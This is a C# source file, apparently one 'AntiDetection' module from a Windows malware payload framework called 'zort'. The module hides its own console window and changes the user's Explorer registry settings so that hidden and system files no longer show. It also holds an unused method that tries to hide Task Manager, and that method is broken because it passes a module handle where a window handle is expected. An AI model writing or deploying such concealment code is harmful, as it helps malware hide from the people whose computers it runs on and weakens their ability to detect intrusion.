using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace zort
{
    public class AntiDetection : IPayloadModule
    {
        public ElevationType ElevationType => ElevationType.Both;

        public string ModuleName => "AntiDetection";

        public void Start()
        {
            HideConsole();
            ModuleLogger.Log(this, "Console window is now hidden.");
            HideHiddenFoldersFromExplorer();
            ModuleLogger.Log(this, "Hidden files are now hidden from explorer.");
        }

        public void Stop()
        {
            // No need to stop anything
        }

        public static void HideConsole()
        {

            IntPtr consoleWindow = NativeMethods.GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero)
            {
                NativeMethods.ShowWindow(consoleWindow, NativeMethods.SW_HIDE);
            }
        }

        public static void MinimizeTaskManager()
        {
            //get task manager window handle
            IntPtr taskManagerHandle = NativeMethods.GetModuleHandle("Taskmgr.exe");
            if (taskManagerHandle != IntPtr.Zero)
            {
                //minimize task manager window
                NativeMethods.ShowWindow(taskManagerHandle, NativeMethods.SW_HIDE);
            }
        }

        public static void HideHiddenFoldersFromExplorer()
        {
            try
            {
                RegistryKey explorerKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);

                if (explorerKey != null)
                {
                    explorerKey.SetValue("Hidden", 2, RegistryValueKind.DWord); // Hide hidden files
                    explorerKey.SetValue("ShowSuperHidden", 0, RegistryValueKind.DWord); // Hide system files
                    explorerKey.Close();
                }
            }
            catch
            {

            }
        }
    }
}
